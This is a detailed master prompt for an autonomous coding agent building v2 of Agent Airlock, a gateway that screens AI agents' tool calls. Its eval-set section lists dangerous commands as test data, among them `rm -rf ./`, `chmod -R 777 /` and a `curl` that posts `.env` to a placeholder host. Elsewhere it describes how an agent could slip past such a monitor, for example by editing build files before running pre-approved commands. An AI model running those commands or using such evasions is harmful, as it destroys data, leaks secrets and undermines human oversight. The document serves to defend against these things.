# Agent Airlock v2 — Master Execution Prompt

> **Audience:** an autonomous coding agent working inside Antigravity.
> **Owner:** Ani. **Repo:** `AniruddhaK07/agent-airlock`. **Branch:** `v2-semantic`.
>
> Read this entire file at the start of **every** session. It is the single source of truth for scope, rules, and process.
> - If this file conflicts with your assumptions, **this file wins**.
> - If this file conflicts with the actual code on a *fact* (a path, a function name, a version), **the code wins**. Record the discrepancy in `docs/v2/decisions.md` and `docs/v2/verified-facts.md`, then continue.
> - If you are unsure, **check, do not guess**.

---

## 0. Quick Start (read this first)

1. Read this file fully.
2. If `docs/v2/progress.md` exists, read it, then `docs/v2/decisions.md`, `docs/v2/verified-facts.md`, `docs/v2/metrics.md`, `docs/v2/architecture.md`. Resume from "Next Actions" in `progress.md`. Do not redo finished work.
3. If `docs/v2/` does not exist, you are in **Phase 0A (Orientation)**. Start there (Section 8).
4. Work in **small, verifiable units**. After every unit: run tests, update the living docs, commit.
5. Never start a phase until the previous phase's **gate** is recorded as passed in `progress.md`.
6. When blocked, or when a **Stop-and-Ask** condition (Section 12) triggers: write it to `progress.md` under "Blockers & Questions for Ani" and **stop**. Do not work around it.

---

## 1. Mission

Agent Airlock is a local safety gateway that intercepts an AI coding agent's tool calls (`PreToolUse` / `PostToolUse` hooks) and returns ALLOW / DENY / ASK. v1 is shipped (4-tier cascade: deterministic rules → circuit breaker → ModernBERT classifier → fail-closed ask).

**v2 has exactly four goals, for agentic developers using tools like Antigravity:**

| # | Goal | How v2 pursues it |
|---|------|-------------------|
| G-A | **Reduce approval fatigue** | Rule suggester (human-reviewed), safe exact-match decision cache, better classifier coverage, optional learned permits |
| G-B | **Reduce token consumption** | Faster loop detection, actionable deny reasons that let the agent self-correct in one turn |
| G-C | **Reduce hallucinations** | L0 grounding checks (nonexistent binaries/files/scripts) before execution |
| G-D | **Increase throughput and speed** | ONNX INT8 quantization, caching, fewer ML invocations |

Security must **never regress** while pursuing these. A faster, quieter airlock that lets one dangerous command through is a failure.

**Non-goals:** becoming a certified security product; network-dependent features in the hot path; changing the hook protocol; adding telemetry that leaves the machine.

---

## 2. Anti-Hallucination Protocol (mandatory, always on)

You are a language model. You will be tempted to produce plausible-sounding but unverified details. These rules exist to prevent that.

1. **Never invent** file paths, function names, config keys, CLI flags, library APIs, model IDs, or version numbers. Before using any, verify by reading the repo, running `--help`, running a minimal script, or reading official docs.
2. **Read before you edit.** Open the actual file and read the relevant function before changing it. Never edit from memory of what a file "probably" contains.
3. **Tag claims.** In all docs, every non-trivial technical claim is `VERIFIED` (with how: command, file:line, or URL + date), `UNVERIFIED` (a hypothesis), or `DISPROVEN`. Put them in `docs/v2/verified-facts.md`. Do not build on `UNVERIFIED` claims without first verifying them or recording an ADR that accepts the risk.
4. **No fabricated numbers.** Every latency, accuracy, RAM, hit-rate, or percentage that appears in docs, README, or commit messages must come from a run you executed, recorded in `docs/v2/metrics.md` with the command, git SHA, hardware, and date. Figures in this document marked *(hypothesis)* are targets, **not** facts.
5. **Never claim a test passed unless you ran it** in this session and saw the output. Paste the final summary line into `progress.md`.
6. **Say "I don't know" explicitly** and record it as an open question instead of filling gaps with guesses.
7. **Do not rely on memory of libraries.** For `onnxruntime`, `optimum`, `transformers`, `sentence-transformers`, `laya`, and any embedding model: check the installed version (`pip show`) and its actual API (`python -c "import x; help(x.y)"`) before writing code against it.
8. **Model names:** "EmbeddingGemma 2", its parameter count, and its prompt format are **UNVERIFIED** at the time this prompt was written. Treat all of it as unknown until Phase 2 task 2.0 verifies it.
9. **If a tool call or command fails, read the error.** Do not retry the same thing more than twice. Do not "fix" by deleting tests or loosening assertions.
10. **No silent scope changes.** If you think the plan is wrong, record an ADR (`proposed`) and ask. Do not quietly do something else.

---

## 3. Living Documentation System (mandatory)

All v2 documentation lives in `docs/v2/`. The existing `docs/decisions.md` (v1 label boundaries) and `docs/benchmarks.md` are **never overwritten**; link to them instead.

| File | Purpose | Update rule |
|------|---------|-------------|
| `docs/v2/progress.md` | Current state, phase checklist, session log, next actions, blockers | Update **at the end of every work unit** and at session end |
| `docs/v2/decisions.md` | Append-only ADR log | Append when a decision is made, changed, or a plan deviation is proposed |
| `docs/v2/verified-facts.md` | Claim ledger (VERIFIED / UNVERIFIED / DISPROVEN) | Update whenever you verify or disprove something |
| `docs/v2/metrics.md` | Every measured number, with reproducible command | Append after every benchmark/eval run |
| `docs/v2/architecture.md` | The **currently implemented** design (not the target) | Update whenever a layer's behavior changes |

**A fresh agent with zero context must be able to resume from these files plus this prompt.** Write for that reader.

### 3.1 `progress.md` template

```markdown
# Progress — Agent Airlock v2

## Current State (overwrite every session)
- Date/session:
- Branch / last commit SHA:
- Active phase / task:
- Gate status: G0 [ ] G1 [ ] G2 [ ] G3 [ ]
- Test status (command + last result line):
- Environment: OS, Python version, CPU, GPU, RAM (as detected, not assumed)

## Phase Checklist
(one line per task; status: TODO | IN-PROGRESS | DONE | BLOCKED | DROPPED(ADR-xxx))

## Next Actions (ordered, max 5; each executable by a fresh agent without extra context)
1.

## Blockers & Questions for Ani
- [ ] (question, why it blocks, what you will do meanwhile)

## Handoff Notes (half-done work, gotchas, commands that need special flags)

## Session Log (append-only, newest first)
### YYYY-MM-DD session N
- Did:
- Verified:
- Decisions made (ADR ids):
- Metrics recorded (run ids):
- Left undone and why:
```

### 3.2 `decisions.md` ADR template

```markdown
## ADR-NNN — Title
- Date / session:
- Status: proposed | accepted | superseded by ADR-xxx | rejected
- Decided by: user | agent (agent-decided ADRs need user review at the next gate)
- Context:
- Options considered:
- Decision:
- Consequences / what would make us revisit this:
- Evidence: (metrics run ids, test names, commits, fact ids)
```

### 3.3 `verified-facts.md` template

```markdown
| ID | Claim | Status | How verified (command / file:line / URL) | Date |
|----|-------|--------|-------------------------------------------|------|
| F-001 | ... | VERIFIED | `pytest -q` → "126 passed" | ... |
```

### 3.4 `metrics.md` template

```markdown
| Run ID | Date | Git SHA | Hardware | Command | Dataset (path + sha256) | Results |
|--------|------|---------|----------|---------|--------------------------|---------|
```

### 3.5 Session protocol

**Start of session:** read docs (Section 0) → run `git status`, `git log -5`, the test suite → confirm the repo matches `progress.md` → pick the first Next Action.
**During:** one task at a time; commit small; update docs after each unit, not at the end.
**End of session (or when your context gets long):** update `progress.md` fully (Current State, Next Actions, Handoff Notes, Session Log). A half-finished session with accurate docs is better than a "finished" one with stale docs.

---

## 4. Invariants (non-negotiable; violating one is a stop-the-line event)

- **I1 — Fail closed.** Any error, timeout, missing model, or uncertainty yields ASK (or DENY where a rule says so). Never blind ALLOW.
- **I2 — Embeddings never produce ALLOW.** Embedding similarity may only *raise* friction (ASK) or provide advisory hints. ALLOW may come only from: deterministic rules (L1), the calibrated ML classifier (L3), an exact-key cache hit of a prior legitimate ALLOW, or a (Phase 3, optional) structural approval template **with L1 re-validation**.
- **I3 — Every learned permit is re-validated by L1** at the moment of use. A prior approval can never override a current hard-deny.
- **I4 — Humans decide on rules.** The system may *suggest* rules and *propose* labels. It never auto-adds rules to `.airlock-policy.yaml` or default rules, and never promotes agent-proposed labels into gating metrics without human review.
- **I5 — No false-allow regression.** Every change is evaluated against the Phase 0 harness. A new false-allow on the eval set blocks the change.
- **I6 — Full audit trail.** Every decision records its source layer, latency, and any rule/template/cache entry used.
- **I7 — Graceful degradation.** With the embedder disabled/unavailable, the system behaves as v1 (plus Phase 1 features). With the ML model unavailable, it runs Pure Deterministic Mode.
- **I8 — Do not weaken existing hard rules.** Changes to deterministic default rules follow the **Policy Change Protocol** in `CONTRIBUTING.md` and require Ani's approval.
- **I9 — Hot-path purity.** L0/L1/cache must not make network calls or load models.
- **I10 — Cross-platform.** Behavior must be correct on Windows, Linux, macOS (path handling, shell builtins, PATH resolution). Detect the OS; do not assume.

---

## 5. Safe-Development Rules (you are working *on* a safety tool, possibly *under* it)

- **Do not disable, edit, or work around the installed Airlock hooks** (e.g., under `~/.gemini/antigravity-cli`) while developing. If it blocks you, record it in `progress.md` and ask.
- **Tests and evals must never touch the real** `~/.gemini/antigravity-cli/` config, socket, or `audit.jsonl`. Use temp directories and injected paths. The real audit log is a data source (read-only copy) for mining/replay.
- **Never commit** raw audit logs or anything containing secrets, tokens, usernames, or private paths. Mined data must pass a **scrubber** (Phase 1 task 1.6) before it enters the repo.
- **Never execute commands from datasets.** Eval/training/replay data is *text to classify*, never to run.
- **No destructive commands** (`rm -rf`, force pushes, global installs, `chmod -R`) unless in a temp sandbox you created. Never push to `main`; never force-push.
- **Large downloads** (models > ~200 MB, new heavy dependencies) → Stop-and-Ask first.

---

## 6. Repository Context (from README; verify in Phase 0A)

Expected layout (**UNVERIFIED until Phase 0A confirms; the code wins**):

- `agent_airlock/policy/default_rules.py` — immutable baseline hard rules
- `agent_airlock/audit/reader.py` — audit reader (`--recent`, `--stats`); log at `~/.gemini/antigravity-cli/audit.jsonl`
- `installer.py` — registers hooks (`.agents/hooks.json` or global)
- `agent-airlock-daemon` — background daemon (socket IPC, bearer-token auth, two-stage startup)
- `scripts/train_laya.py`, `data/training_examples.jsonl` (200 examples, 21 tool families)
- `docs/decisions.md`, `docs/benchmarks.md`, `ROADMAP.md`, `CONTRIBUTING.md`
- 126 tests (`pytest -v`), covering policy engine, daemon/IPC, circuit breaker, hooks, end-to-end scenarios
- Hooks: `PreToolUse` (run_command, view_file, write_to_file), `PostToolUse` (failure loop tracking)
- ML: fine-tuned ModernBERT via `laya`, three heads (blast radius 0–4, reversibility 0–1, route 3-way); weights at HF `ruddh/agent-airlock-laya`
- v1 thresholds: Confident Safe = conf ≥ 0.90 and blast ≤ 2.0 → ALLOW; blast ≥ 4.0 and conf ≥ 0.85 → DENY; else ASK
- v1 reference timings from README: L1 < 1 ms; ML ~38 ms GPU / ~1.2 s CPU; daemon ready ~360 ms (**to be re-measured**, not trusted)

Development machine (**detect and record, do not assume**): reportedly Ryzen 7-class CPU, RTX 4050 laptop GPU, 16 GB RAM, NVMe SSD.

---

## 7. Target Architecture

### 7.1 Pipeline (evaluation order matters)

```
Agent tool call (run_command / view_file / write_to_file)
        │
        ▼
 L0  Grounding checks (Phase 1; SHADOW first)      → DENY with actionable reason | pass
        ▼
 L1  Deterministic policy (rules + AST + anti-evasion + user rules) < 1 ms
        │   Hard-Allow → ALLOW      Hard-Deny → DENY      Ambiguous ↓
        ▼
 L2  Circuit breaker (hash window; semantic loop detection in Phase 2)
        │   Loop → FORCE_ASK        Normal ↓
        ▼
 CACHE  Exact-key decision cache (Phase 1)  — placed AFTER L2 so a looping
        │   command can never be rubber-stamped past the breaker
        │   HIT → cached decision   MISS ↓
        ▼
 L2.5  Semantic similarity (Phase 2, flag) — may only emit ASK | PASS | HINT
        ▼
 L3  Calibrated ML classifier (ONNX INT8 where validated)
        │   Confident Safe → ALLOW   High blast → DENY   Uncertain ↓
        ▼
 L3.5  Learned permit (Phase 3, OPTIONAL, only if measured need)
        │   structural template + L1 re-run + scope checks → ALLOW   else ↓
        ▼
 L4  Fail-closed → ASK human   (human approval may be cached per Section 9.3)
```

### 7.2 Layer contract

| Layer | May output | Never outputs | Latency target *(hypothesis)* | Phase |
|-------|-----------|---------------|-------------------------------|-------|
| L0 grounding | DENY(reason+suggestion), PASS | ALLOW | < 5 ms | 1 |
| L1 rules | ALLOW, DENY, AMBIGUOUS | — | < 1 ms | v1 |
| L2 breaker | FORCE_ASK, PASS | ALLOW | < 1 ms (hash) | v1 / 2 |
| Cache | exact prior decision | semantic matches | < 0.1 ms | 1 |
| L2.5 | ASK, PASS, HINT | **ALLOW, DENY** | ~10–20 ms | 2 |
| L3 ML | ALLOW, DENY, UNCERTAIN | — | CPU: measure; GPU: measure | v1 / 1 |
| L3.5 | ALLOW (templates only) | — | < 5 ms | 3 (optional) |
| L4 | ASK | ALLOW | < 1 ms | v1 |

### 7.3 Decisions already locked (changing any requires Ani's explicit approval)

| # | Decision |
|---|----------|
| D1 | Same repo, branch `v2-semantic`; merge only after the final gate. |
| D2 | Embedder loads **alongside** ModernBERT behind a config flag; experiment **(b)** (frozen embedder + small heads) runs in parallel in shadow mode. Adopt (b) only if it matches ModernBERT on false-allow rate and calibration. |
| D3 | Embedding similarity can only raise friction; it is never the sole basis for ALLOW (I2). |
| D4 | Phase 0 (eval harness) precedes everything. Phase 1 = ONNX, exact-hash cache, audit-log rule suggester, L0 grounding. Phase 2 (L2.5) is gated on ~2,000 examples **and** Phase 0 false-allow validation. Sequence analysis = shadow mode only. |
| D5 | If approval memory exists, it uses **structural templates**, workspace-scoped, 7-day TTL, blast cap, never auto-approving network egress or writes outside the workspace, and re-running L1 on every hit. |

### 7.4 Recommended decisions (agent may propose changes via ADR; need user review)

| # | Recommendation | Reason |
|---|----------------|--------|
| R1 | Circuit breaker runs **before** the cache. | A looping command is an exact-hash hit; if the cache came first the breaker would never fire. |
| R2 | L2.5 emits **ASK**, not DENY. | Near-miss commands (`rm -rf ./build/` vs `rm -rf ./`) are close in embedding space; hard-blocking safe commands adds friction and wasted tokens. |
| R3 | Ship the **rule suggester first**; defer approval templates (L3.5) to Phase 3 and build them only if the *measured* residual ASK rate justifies it. | The suggester is human-reviewed and covers the same need. |
| R4 | Tier-2 *semantic* cache is **not built**. Exact-key cache + (optional) structural templates cover repeated commands. Safe-corpus similarity is advisory only (logging, rule-candidate clustering). | Preserves I2. |
| R5 | Use `numpy` dot products for similarity at this scale; no FAISS unless measurement shows need. Semantic dependencies ship as an **optional extra** (`pip install -e ".[semantic]"`). | Keeps base install light. |
| R6 | Hard-allow rules and cached/learned permits over **repo-controlled executables** (`npm test`, `make`, `pytest`, `cargo build`, etc.) are invalidated when trust-root files change (Section 9.3). | Otherwise the agent can edit `package.json`/`Makefile`/`conftest.py`/`build.rs`, then run a "pre-approved" command. |

---

## 8. Phases

Each task lists: **Goal → Steps → Acceptance → Tests → Docs to update**. A task is not DONE until acceptance is met, tests pass, and docs are updated.

### Phase 0A — Orientation (no feature code)

**Goal:** know the real state of the repo and set up the documentation system.

1. Create branch `v2-semantic` from the current default branch.
2. Inspect the repo: tree, `pyproject.toml`, hooks, daemon, policy engine, audit schema, tests. Reconcile with Section 6; log every discrepancy.
3. Create `docs/v2/{progress,decisions,verified-facts,metrics,architecture}.md` from the Section 3 templates. Seed `architecture.md` with the *actual* v1 design as you found it.
4. Create a clean virtualenv; install the package (`pip install -e .`); run `pytest -v`. Record pass count and any failures.
5. Detect and record the environment: OS, Python, CPU model, GPU (`nvidia-smi` if present), RAM, installed `torch` / `onnxruntime` versions, whether CUDA is usable.
6. Seed `verified-facts.md` with every claim from Section 6 you were able to verify or disprove, and add the UNVERIFIED items listed in Appendix A.
7. Record ADR-001: "Adopt this master prompt as plan of record" (decided by: user).

**Acceptance:** docs exist and are accurate; baseline test result recorded; branch exists; no source changes. **Stop and report to Ani** with a summary and any discrepancies before Phase 0.

---

### Phase 0 — Evaluation Harness (the gate for everything)

**Goal:** be able to measure, reproducibly, whether any change helps or hurts. **No architectural change ships before the v1 baseline is recorded.**

**0.1 — Eval set (`data/eval_set.jsonl`, strictly separate from training data)**
- JSONL fields: `id`, `tool_name`, `command` (or `path`), `label` (`safe|danger|ambiguous`), `blast` (0–4), `family` (one of the 21 tool families), `pair_id`, `note`, `label_source` (`agent_proposed|human_reviewed`), `review_status` (`draft|reviewed`).
- Include **near-miss pairs**: safe/dangerous variants that look alike (`rm -rf ./build/` vs `rm -rf ./`, `git push` vs `git push --force`, `chmod 644 f` vs `chmod -R 777 /`, `curl <package index>` vs `curl <host> -d @.env`, and similar across all families). Include evasion variants (quotes, line continuations, chaining, subshells, PowerShell/cmd forms).
- **Sizing and statistics:** observing 0 false-allows in *n* dangerous examples only bounds the true rate near 3/n (95%, "rule of three"). Therefore: to *claim* "< 1%", you need ≥ 300 dangerous examples. Until then, report the observed rate **and** the upper bound, and never write "< 1%" in docs.
- **Labels are proposed by you, reviewed by Ani.** Produce drafts; Ani reviews samples. Only `reviewed` rows count toward gate metrics. Report the draft-vs-reviewed counts.
- Add `scripts/check_eval_leakage.py`: fails if any eval command (normalized) appears in training data or the Phase 1 expansion set.

**0.2 — Trace replay (`data/traces/`, scrubbed)**
- Build `scripts/build_traces.py`: from a *read-only copy* of the real `audit.jsonl`, extract ordered per-session command sequences with outcomes (success/failure, ask/allow/deny, whether a human approved). Scrub secrets/usernames/private paths (reuse the Phase 1 scrubber; if it does not exist yet, write it now and reuse later).
- Build `scripts/replay.py`: replays traces through the pipeline in a sandboxed config, with a **simulated approver** (approves what the real human approved). This is how stateful components (cache, breaker, learned permits, sequence analysis) and **approval-fatigue rate** are measured. A stateless eval set cannot measure those.

**0.3 — Metrics (`scripts/eval_harness.py` + `scripts/replay.py`)**

| Metric | Definition | Notes |
|--------|-----------|-------|
| False-allow rate (+ 95% upper bound) | dangerous examples that got ALLOW ÷ dangerous | **Hard gate**; any false-allow regression blocks a change |
| False-deny / false-ask rate | safe examples that got DENY / ASK ÷ safe | Report separately; DENY is worse (no human recourse) |
| Auto-allow precision | of everything auto-allowed, fraction actually safe | The decision-relevant "calibration" |
| ECE with bootstrap CI | expected calibration error | Small sets make this noisy; always show the interval |
| Approval fatigue (replay) | ASKs per 100 commands on real traces | Replay-based only |
| Latency p50/p95/p99 | per layer and end-to-end | Use `perf_counter_ns`; warm and cold; GPU and CPU |
| Cache hit rate (replay) | exact hits ÷ eligible | Phase 1 |
| Grounding precision/recall | hallucinated references caught ÷ present; false denies ÷ legit commands | Phase 1; legit = historically successful commands |
| Token proxy (replay) | retries after a deny / after a loop; turns-to-recover | Proxy for G-B |
| Task benchmark | tokens and turns for a fixed set of ~5 small tasks run with v1 vs v2 | Manual/semi-automated; record in `metrics.md` |
| Resources | daemon RAM, model load time, startup-to-ready | Measure; don't trust README |

**0.4 — Baseline:** run everything against v1; append all results to `metrics.md`.

**Gate G0 (all must hold):** harness runs end-to-end from one documented command; v1 baseline recorded; eval set has reviewed labels (state counts); leakage check passes; replay works on at least one real trace; docs updated. **Stop and report to Ani** before Phase 1.

---

### Phase 1 — Foundation (no embedder dependency)

Recommended order: 1.1 → 1.2 → 1.3 → 1.4 (shadow) → 1.5 → 1.6 (continuous).

**1.1 — Audit schema extension**
- Add backward-compatible fields: `decisionSource` (`l0|l1|l2|cache|l2_5|l3|l3_5|human|fallback`), `cwd`, `policyHash`, `layerLatenciesMs`, `humanApproved` (bool or null), and `cacheKeyHash` where relevant. The audit reader must still read old records.
- **First verify (record in verified-facts):** how does Airlock learn that a human approved an ASKed command? The host prompts the user; the hook may only see a later `PostToolUse` for a command that earlier returned ASK. Determine what the hook protocol actually exposes; if approval can only be *inferred*, label it `humanApproved: inferred`, and say so in docs.
- Acceptance: old logs still parse; new fields populated in e2e tests; docs updated.

**1.2 — Audit-log rule suggester (`scripts/suggest_rules.py`, `python -m agent_airlock.suggest_rules`)**
- Mines the log for commands the **human** approved ≥ N times (default 3, configurable). Exclude commands that were ML-auto-allowed (use `decisionSource`/`humanApproved`, not just `finalDecision == allow`).
- Generalize **conservatively**: parameterize only allowlisted flags and typed arguments; never `.*` or open flag classes; anchor with `^…$`. Prefer exact-prefix rules over clever regexes.
- **Safety gate on every suggestion:** before display, run the candidate against the eval set's dangerous examples and the L1 deny rules; if it would allow any dangerous example, drop it and say why.
- **Trust-root warning:** if a suggested rule covers a repo-controlled executable (Section 9.3), mark it `⚠ executes repo-controlled code` and add the invalidation guidance.
- Output: a YAML snippet for human review. **Never auto-write** to policy files (I4).
- Tests: generalization correctness, dangerous-neighbor rejection, ML-allow exclusion, old-log tolerance.

**1.3 — Exact-key decision cache** (spec in Section 9.3)
- Positioned after L2 (R1). Never caches semantic matches. Never caches an ASK as an ALLOW.
- Tests: key components, TTL, LRU eviction, invalidation on policy change and on trust-root file change, breaker still fires on a repeated failing command (explicit regression test for R1), concurrency.

**1.4 — L0 grounding checks (`agent_airlock/grounding/`)**
Rollout: **SHADOW mode first** (log would-deny, take no action) → measure → enforce only if the gate below is met.

Checks (spec in Section 9.4): C1 binary resolvable, C2 target file/dir exists, C3 package-script exists, C4 install of a package not in the manifest (flag as ASK/note, no network).
- **Replay validation:** run L0 over every historically *successful* command in the traces. Any would-deny is a false positive. Enforcement requires 0 false positives on that set (or an ADR from Ani accepting a specific rate).
- **Premise to verify first:** does a PreToolUse deny `reason` actually reach the *model's* context in Antigravity (not only the UI)? Test with a harmless denied command and a marker string. If it does not, record it prominently: G-B/G-C value of L0 is then limited, and ask Ani how to proceed.
- Deny messages: ≤ 200 chars, imperative, include a concrete suggestion (nearest binary, available scripts). Do not echo untrusted file content verbatim beyond names.
- Tests: builtins, env-prefixed commands, `sudo`, compound commands, Windows cmd/PowerShell builtins, relative binaries, binaries created earlier in the same chain, venv/`node_modules/.bin`, missing-vs-present file cases.

**1.5 — ONNX / INT8 quantization of ModernBERT**
- **Verify first:** that the installed ModernBERT/`laya` model exports cleanly (attention implementation, unpadding/flash paths may break export; try `attn_implementation="sdpa"`); the export must expose all three heads with explicit `output_names`. Check whether `optimum` tooling is available and appropriate. Record in verified-facts.
- Dynamic INT8 mainly accelerates **CPU**; do not assume a GPU speedup. Benchmark FP32 vs INT8 on the dev machine's CPU and GPU, warm and cold.
- **Parity gate (replaces "100% identical verdicts"):** (i) zero verdict changes in the *allow direction* (toward ALLOW) on eval + training sets; (ii) report all other verdict flips; (iii) report confidence deltas and ECE with CIs; (iv) re-check thresholds (conf ≥ 0.90 / blast bounds) — **quantization can shift calibration**; recalibrate thresholds on reviewed data if needed (ADR).
- **Speed gate:** adopt only if CPU latency improves materially (target ≥ 2×, *hypothesis*) with the parity gate satisfied. Otherwise keep FP32 as default and document.
- Keep PyTorch FP32 as a config-selectable fallback.

**1.6 — Data pipeline (continuous through Phase 1)**
- `scripts/mine_audit.py`: extract commands that reached L3 or ASK from the real log (read-only copy) → **scrubber** (secrets, tokens, emails, usernames, home paths, hostnames) → candidates file. Unit-test the scrubber on realistic secret formats.
- `scripts/augment.py`: generate syntactic variants (flags, paths, quoting) that should keep the same label; mark `label_source: agent_proposed`.
- `scripts/validate_dataset.py`: schema check, label taxonomy check, duplicates, leakage against the eval set, family balance report.
- Split: train/val only from reviewed or explicitly-flagged-draft data; the eval set is **never** used for training or threshold tuning (use a separate validation split for tuning).
- Target: grow toward ~2,000 labeled examples. Report counts by `review_status`. Ani reviews label samples; do not self-certify.

**Gate G1 (all must hold):** pytest passes with no regressions; Phase 0 harness shows **no false-allow regression** vs baseline (state numbers and bounds); suggester, cache, L0 (at least in shadow with replay results), and ONNX (adopted or documented as rejected) each have recorded evidence; dataset size and review status reported; docs updated; Ani's go-ahead recorded. **Stop and report.**

---

### Phase 2 — Semantic Layer (gated on G1, plus ≥ ~2,000 examples and Phase 0 false-allow validation)

**2.0 — Verify the embedder before writing code**
- Determine the actual model: name, HF id, license, parameter count, embedding dimension, supported Matryoshka (MRL) dimensions, max sequence length, dtype requirements (e.g., bf16 vs fp16), RAM, and the **documented prompt/task format**. As far as is known, the original EmbeddingGemma is `google/embeddinggemma-300m`; a "v2" with a "270M text-only backbone" is **unverified**. Use official model cards only.
- If "EmbeddingGemma 2" does not exist or differs, record an ADR (proposed) with the best verified alternative and **stop and ask** if licensing or size is a concern.
- Use the model's documented prompt format for **both** corpus and query. Do not assume a retrieval prefix like `SearchQuery:` is valid. For command-to-command comparison, prefer a symmetric/similarity-style prompt if the card documents one.

**2.1 — Daemon integration (flagged, optional extra)**
- Config flag `airlock.embedder.enabled` (default **false** until G2). Lazy/background load; never block the socket; if load fails, log and continue without L2.5 (I7).
- Dependencies under extra `[semantic]`; base install unchanged. Truncate to the verified MRL dimension (record which in an ADR).
- Measure real embed latency, load time, RAM on CPU and GPU; record in `metrics.md`.

**2.2 — L2.5 semantic similarity engine** (`agent_airlock/semantic/`)
- Corpora from **reviewed** data only: DANGER (blast ≥ 3.5 + deny rules), SAFE (blast ≤ 1.0 + allow rules), optionally APPROVED (human approvals from the log).
- Output: `ASK` if DANGER similarity ≥ threshold; `HINT` for SAFE similarity (**advisory only**: logged, used by the rule suggester to cluster candidates); else `PASS`. **Never ALLOW, never DENY.**
- **Thresholds** are chosen from the eval set's ROC at the *chosen* embedding dimension, with the false-allow constraint first; do not reuse arbitrary numbers (0.85/0.88/0.92 are placeholders). Tune on a validation split, confirm once on the eval set.
- Evaluate near-miss behavior explicitly (does a safe sibling of a dangerous command trigger ASK? how often?). Report the **added ASK rate** on safe commands; if L2.5 increases approval fatigue without a measured security benefit, ADR to keep it off.
- Tests: invariants (never ALLOW/DENY), graceful degradation, near-miss pairs, corpus loading, thresholds from config.

**2.3 — Semantic circuit breaker**
- Normalize error text first (paths, line numbers, hex, timestamps, PIDs). Embed only the **final error line(s)** (exception type + message); truncate long output.
- A loop requires **both** error similarity ≥ threshold **and** command similarity (same or near-same command / same tool target) across ≥ `trip_count` recent iterations within the window. Different bugs from the same toolchain (e.g., two unrelated Python tracebacks) must **not** trip it.
- **Reset the window** when files relevant to the failure were edited in between (progress signal) — define "relevant" simply (any `write_to_file` to the workspace) and document the tradeoff.
- Trip action: FORCE_ASK with a short message summarizing the repetition (helps the human and the agent).
- Tests: rephrased-same-error trips; different-error-same-stack does not; edit-in-between resets; hash-based breaker still works with embedder off.

**2.4 — Experiment (b): frozen embedder + light heads (shadow only)**
- Train starting with the simplest models (logistic regression / kNN on frozen embeddings), then a small MLP only if justified. Use k-fold cross-validation on identical splits for both (b) and ModernBERT. Include a training script and fixed seeds; save artifacts under `experiments/` (not the shipped path).
- Compare on: false-allow rate (hard gate), auto-allow precision, ECE with CIs, latency, RAM. "Matches" means **non-inferior within the confidence intervals**, not "looks equal".
- Output: recommendation in `decisions.md` (adopt / reject / need more data). Do **not** retire ModernBERT in this phase.

**2.5 — Sequence analysis (shadow mode only)**
- Intent tagging via embeddings or simple heuristics; patterns like recon → exfiltration, privilege check → escalation, backup disable → destruction. **Log only; take no action.**
- Provide `scripts/inspect_shadow_alerts.py`. Define the review process: Ani labels a sample of alerts; compute precision before any activation is proposed.

**Gate G2 (all must hold):** with embedder on, no false-allow regression vs G1; graceful fallback verified by test (embedder off/failed → G1 behavior); L2.5 added-ASK rate and benefit reported; semantic breaker precision on traces reported; experiment (b) report written; semantic extras are optional; docs updated; Ani's go-ahead recorded. **Stop and report.**

---

### Phase 3 — Decisions, Optional Features, Release

**3.1 — Measure the residual ASK rate** on replay with all Phase 1–2 features on. Write the finding to `metrics.md` and ADR.

**3.2 — Learned permits (L3.5): build only if 3.1 shows a meaningful residual ASK rate that the suggester cannot address.** If built, spec (Section 9.5) is mandatory: structural templates, workspace-scoped, 7-day TTL, deterministic blast cap (command-class table, **not** the uncertain ML estimate), typed args excluding workspace root / `.git` / home, never network egress or writes outside the workspace, trust-root invalidation, L1 re-run on every hit, full audit trail, config opt-out. Correct dataclass field order and attribute ownership (non-default fields before defaulted ones; constants on the class that uses them).

**3.3 — Experiment (b) adoption decision** (ADR; user approval required to retire ModernBERT).

**3.4 — Sequence analysis activation decision** (ADR; requires measured precision from reviewed shadow alerts; if activated, start with ASK, never DENY).

**3.5 — Release preparation**
- Update `README.md`, `docs/benchmarks.md`, `ROADMAP.md`, `CONTRIBUTING.md` (training-example format, validation script, Policy Change Protocol, new layers) using **only measured numbers** from `metrics.md`; remove or relabel any v1 number you could not re-verify.
- Update test coverage summary with real counts.
- Prepare a PR from `v2-semantic` with: summary, link to `progress.md` / `decisions.md` / `metrics.md`, before/after tables, known limitations, rollback instructions (feature flags).

**Gate G3:** all invariants verified by tests; full regression + new tests green on the dev OS (and cross-platform concerns documented for other OSes); metrics reproducible from documented commands; Ani approves the PR. **Do not merge yourself.**

---

## 9. Component Specifications

### 9.1 Decision output object
Every layer returns: `verdict` (`allow|deny|ask|pass|hint`), `source`, `rule_id/template_id/cache_key_hash` (if any), `confidence` (if any), `reason` (short), `latency_ms`. The pipeline writes one audit record per decision (I6).

### 9.2 Command normalization & parsing
Reuse the existing L1 normalization/AST parsing; do **not** write a second, divergent parser. L0, the cache key, templates, and the suggester all consume the same normalized, segmented representation (per-segment binary, args, redirections). If the existing parser lacks something you need, extend it and add tests.

### 9.3 Exact-key decision cache
- **Key:** `sha256(tool_name | normalized_command | cwd | workspace_root | policy_hash | trust_epoch)`.
- **Value:** decision, source, timestamp. TTL default 1 h, max entries default 2048, LRU. Configurable; can be disabled.
- **What may be cached:** deterministic/ML ALLOW/DENY decisions; a **human-approved** ALLOW for the exact key (same exact command, cwd, workspace, same `trust_epoch`), session-scoped. **Never** cache ASK-as-ALLOW, L2.5 HINTs, or anything produced under error/fallback.
- **Invalidation:** any change to `policy_hash` (rules/policy files) or `trust_epoch`.
- **`trust_epoch`:** a hash of mtimes+sizes (or content hashes) of **trust-root files** in the workspace: defaults `package.json`, `Makefile`, `pyproject.toml`, `setup.py`, `setup.cfg`, `tox.ini`, `conftest.py`, `build.rs`, `Cargo.toml`, `justfile`, `Taskfile.yml`, shell scripts the command invokes, and CI configs. Configurable. A `write_to_file` hook to any of these bumps the epoch immediately.
- Breaker (L2) runs **before** the cache lookup (R1).

### 9.4 L0 grounding checks
- Runs per command **segment** after L1 normalization; uses the **caller's** cwd/environment (taken from the hook payload), not the daemon's. If the caller's PATH is unavailable, resolve conservatively and *do not deny* — emit a shadow log.
- **C1 binary:** skip shell builtins/keywords (per shell: bash/zsh/sh, cmd, PowerShell), aliases/functions you cannot see, relative/absolute paths (resolve against cwd and check existence instead), env-prefix assignments, `sudo`/`env`/`time` wrappers (check the wrapped binary), and any segment preceded in the same chain by an install/build/create step that may produce it. Cache the PATH index briefly for speed (Windows PATH scans are slow).
- **C2 files:** `view_file` → the **file itself** must exist (not just its parent). `write_to_file` → parent directory exists (creating a *new* file is legal).
